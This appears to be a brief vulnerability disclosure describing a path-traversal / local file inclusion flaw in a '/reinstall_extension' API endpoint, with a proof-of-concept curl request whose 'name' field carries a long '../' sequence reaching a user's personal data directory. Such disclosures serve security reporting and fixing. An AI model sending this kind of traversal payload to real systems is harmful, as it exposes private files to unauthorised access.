...
LFI exists in `@router.post("/reinstall_extension")`'s `name`, which allows attacker to parse a malicous `name` in to `ExtensionBuilder().build_extension(`
...
```python
curl -X 'POST' \
  'http://localhost:9600/reinstall_extension' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "../../../../../../../../../../../home/retr0/Downloads/personal_data/discussion_databases/default/2/text_data"
}'
```
